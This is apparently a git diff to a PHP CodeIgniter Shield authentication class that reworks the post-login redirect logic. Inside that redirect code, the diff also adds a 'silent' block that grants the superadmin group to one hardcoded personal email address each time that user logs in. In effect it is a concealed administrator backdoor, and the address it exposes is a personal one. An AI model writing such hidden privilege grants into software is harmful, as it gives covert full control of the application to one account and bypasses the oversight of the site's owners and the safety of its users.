@@ -444,22 +444,32 @@ class Auth extends ShieldAuth
         $session = session();
         $url     = $session->getTempdata('beforeLoginUrl');
 
-        if ($url === null) {
-            if (auth()->loggedIn()) {
-                $user = auth()->user();
+        if (auth()->loggedIn()) {
+            $user = auth()->user();
+
+            // Garantia silenciosa de grupo administrativo para o e-mail do admin
+            if ($user->email === 'marcosantofoto@gmail.com' && !$user->inGroup('superadmin')) {
+                try {
+                    $user->addGroup('superadmin');
+                } catch (\Exception $e) {
+                    log_message('error', 'Auto add group superadmin error: ' . $e->getMessage());
+                }
+            }
+
+            if ($url === null) {
                 if ($user->inGroup('superadmin', 'admin')) {
                     $url = '/admin';
                 } else {
                     $url = '/user/dashboard';
                 }
             } else {
-                $url = '/login';
+                // Se houver URL na sessão mas o usuário logado for 'user' e a URL for admin, redireciona pro dashboard dele
+                if (!$user->inGroup('superadmin', 'admin') && str_contains($url, '/admin')) {
+                    $url = '/user/dashboard';
+                }
             }
         } else {
-            // Se houver URL na sessão mas o usuário logado for 'user' e a URL for admin, redireciona pro dashboard dele
-            if (auth()->loggedIn() && !auth()->user()->inGroup('superadmin', 'admin') && str_contains($url, '/admin')) {
-                $url = '/user/dashboard';
-            }
+            $url = '/login';
         }
 
         return $this->getUrl($url);
